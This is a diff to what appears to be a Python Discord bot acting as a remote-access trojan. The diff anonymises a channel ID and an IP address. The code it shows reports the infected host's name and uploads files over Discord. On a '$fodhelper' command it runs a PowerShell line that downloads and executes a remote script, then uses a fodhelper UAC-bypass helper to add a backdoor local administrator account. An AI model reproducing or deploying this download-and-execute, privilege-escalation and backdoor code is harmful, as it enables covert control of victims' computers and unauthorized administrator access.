@@ -16,7 +16,7 @@ client = discord.Client()
 @client.event
 async def on_ready():
     #print('We have logged in as {0.user}'.format(client))
-    channel = client.get_channel(963554813470195775)
+    channel = client.get_channel(chan_ID_here)
     #embedVar = discord.Embed(description="Checking in to work.")    
     #await channel.send(embed=embedVar)
     host_name = discord.Embed(description=socket.gethostname() + " checking in.")
@@ -87,7 +87,7 @@ async def on_message(message):
                     with open(file, 'rb') as f:
                         await message.channel.send(file=discord.File(f))
             if message.content.startswith('$fodhelper'):
-                command = "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.1.7:8180/helper.ps1');helper -custom 'cmd.exe /c net user test123 Password123 /add & net localgroup administrators test123 /add'"
+                command = "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.1.x:8180/helper.ps1');helper -custom 'cmd.exe /c net user test123 Password123 /add & net localgroup administrators test123 /add'"
                 output = subprocess.check_output(command, universal_newlines=True)
                 await message.channel.send(output)
                 time.sleep(10)
